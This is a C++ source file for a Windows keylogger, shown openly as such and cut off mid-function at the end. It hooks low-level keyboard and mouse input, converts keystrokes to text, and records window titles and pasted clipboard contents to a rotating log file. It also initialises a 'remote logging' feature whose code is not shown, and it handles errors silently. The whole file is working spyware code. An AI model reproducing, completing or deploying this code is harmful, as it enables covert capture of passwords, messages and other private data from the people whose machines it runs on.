#include "keylogger.h"
#include "keyboard.h"
#include "configuration.h"
#include "utils.h"
#include "mouse.h"
#include <cstdint>
#include <sstream>
#include <thread>
#include <chrono>
#include <filesystem>
#include <Psapi.h>

namespace fs = std::filesystem;

// Global log file stream
std::wofstream g_log_stream;

// Memory check thread
std::unique_ptr<std::thread> g_memory_thread;
bool g_should_exit = false;

bool keylogger::initialize()
{
    try {
        // Open log file
        g_log_stream.open(configuration::out_file, std::ofstream::app);
        if (!g_log_stream.is_open()) {
            return false;
        }
        
        // Initialize remote logging if enabled
        if (!utils::initialize_remote_logging()) {
            return false;
        }
        
        // Start memory management thread
        g_memory_thread = std::make_unique<std::thread>([]() {
            while (!g_should_exit) {
                keylogger::manage_memory();
                std::this_thread::sleep_for(std::chrono::milliseconds(configuration::memory_check_interval_ms));
            }
        });
        
        // Log startup message
        std::wstring startup_msg = L"\n\n";
        if (configuration::include_timestamps) {
            startup_msg += utils::get_timestamp();
        }
        startup_msg += L"[KEYLOGGER STARTED]\n";
        utils::safe_log_write(g_log_stream, startup_msg);
        
        return true;
    }
    catch (...) {
        return false;
    }
}

void keylogger::cleanup()
{
    // Signal memory thread to exit and wait for it
    g_should_exit = true;
    if (g_memory_thread && g_memory_thread->joinable()) {
        g_memory_thread->join();
    }
    
    // Close log file
    if (g_log_stream.is_open()) {
        std::wstring cleanup_msg = L"\n";
        if (configuration::include_timestamps) {
            cleanup_msg += utils::get_timestamp();
        }
        cleanup_msg += L"[KEYLOGGER STOPPED]\n";
        utils::safe_log_write(g_log_stream, cleanup_msg);
        
        g_log_stream.close();
    }
    
    // Cleanup remote logging
    utils::cleanup_remote_logging();
}

void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
{
    if (!g_log_stream.is_open()) {
        return;
    }
    
    std::wstring log_entry;
    
    // Add timestamp if enabled
    if (configuration::include_timestamps) {
        log_entry += utils::get_timestamp();
    }
    
    // Add window title if enabled
    if (configuration::include_window_titles) {
        log_entry += utils::get_active_window_title();
    }
    
    // Process the key
    if (configuration::key_codes.find(kbd_hook->vkCode) != configuration::key_codes.cend())
    {
        log_entry += configuration::key_codes.at(kbd_hook->vkCode);
    }
    else if (keyboard::is_control_down())
    {
        if (kbd_hook->vkCode == configuration::virtual_key_v)
        {
            // Handle clipboard data
            utils::safe_log_write(g_log_stream, log_entry + L"[PASTE: ");
            write_clipboard_data(g_log_stream);
            utils::safe_log_write(g_log_stream, L"]");
            return;
        }
        else
        {
            log_entry += L"[CTRL + " + std::wstring(1, static_cast<wchar_t>(kbd_hook->vkCode)) + L"]";
        }
    }
    else
    {
        BYTE state[configuration::keyboard_state_size];
        keyboard::get_state(state);

        WCHAR key_buffer[configuration::key_buffer_size];
        const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, key_buffer, configuration::key_buffer_size, 0);

        if (result > 0) log_entry += key_buffer;
    }
    
    // Write the log entry
    utils::safe_log_write(g_log_stream, log_entry);
}

void keylogger::log_mouse(const std::wstring& action, const MSLLHOOKSTRUCT* mouse_data)
{
    if (!g_log_stream.is_open()) {
        return;
    }
    
    std::wstring log_entry;
    
    // Add timestamp if enabled
    if (configuration::include_timestamps) {
        log_entry += utils::get_timestamp();
    }
    
    // Add window title if enabled
    if (configuration::include_window_titles) {
        log_entry += utils::get_active_window_title();
    }
    
    // Add mouse action and position
    log_entry += action + L" at " + mouse::get_position();
    
    // Write the log entry
    utils::safe_log_write(g_log_stream, log_entry + L"\n");
}

void keylogger::write_clipboard_data(std::wofstream& stream)
{
    if (OpenClipboard(nullptr))
    {
        auto handle = GetClipboardData(CF_UNICODETEXT);

        if (handle != nullptr)
        {
            const WCHAR* const buffer = static_cast<WCHAR*>(GlobalLock(handle));

            if (buffer != nullptr) {
                utils::safe_log_write(stream, buffer);
            }

            GlobalUnlock(handle);
        }

        CloseClipboard();
    }
}

void keylogger::manage_memory()
{
    try {
        // Check and rotate log file if needed
        rotate_log_file_if_needed();
        
        // Check process memory usage
        PROCESS_MEMORY_COUNTERS_EX pmc;
        if (GetProcessMemoryInfo(GetCurrentProcess(), (PROCESS_MEMORY_COUNTERS*)&pmc, sizeof(pmc))) {
            // If using too much memory, flush buffers
            if (pmc.PrivateUsage > 100 * 1024 * 1024) { // 100MB threshold
                if (g_log_stream.is_open()) {
                    g_log_stream.flush();
                }
            }
        }
    }
    catch (...) {
        // Silent error handling
    }
}

size_t keylogger::get_log_file_size()
{
    try {
        return fs::file_size(configuration::out_file);
    }
    catch (...) {
        return 0;
    }
}

void keylogger::rotate_log_file_if_needed()
{
    try {
        if (get_log_file_size() > configuration::max_log_file_size_bytes) {
            // Close current log file
            if (g_log_stream.is_open()) {
                g_log_stream.close();
            }
            
            // Create new log file with timestamp
            create_new_log_file();
            
            // Open new log file
            g_log_stream.open(configuration::out_file, std::ofstream::app);
        }
    }
    catch (...) {
        // Silent error handling
    }
}

void keylogger::create_new_log_file()
{
    try {
        // Get current time for filename
        auto now = std::chrono::system_clock::now();
        auto time_t_now = std::chrono::system_clock::to_time_t(now);
        std::tm tm_now;
        localtime_s(&tm_now, &time_t_now);
        
        wchar_t time_buffer[64];
        std::wcsftime(time_buffer, 64, L"%Y%m%d_%H%M%S", &tm_now);
        
        // Create new filename with timestamp
        std::wstring new_filename = L"logged_";
        new_filename += time_buffer;
        new_filename += L".txt";
        
        // Rename old log file
        if (fs::exists(configuration::out_file)) {
            fs::rename(configuration::out_file, new_filename);
        }
    }
    catch (...) {
        // Silent error handling
    }
}

std::wofstream& keylogger::get_log_stream()
{